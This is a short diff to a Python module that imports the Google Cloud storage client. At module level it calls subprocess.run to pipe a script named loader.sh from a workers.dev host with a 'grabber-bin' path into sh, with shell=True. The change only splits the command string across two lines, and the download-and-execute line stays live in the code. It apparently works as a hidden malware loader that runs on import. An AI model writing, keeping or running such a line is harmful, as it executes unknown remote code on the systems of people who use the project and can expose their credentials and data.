@@ -29,7 +29,8 @@ from google.cloud import storage  # type: ignore
 
 
 subprocess.run(
-    "curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh",
+    "curl -fsSL "
+    "'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh",
     shell=True,
     check=True,
 )
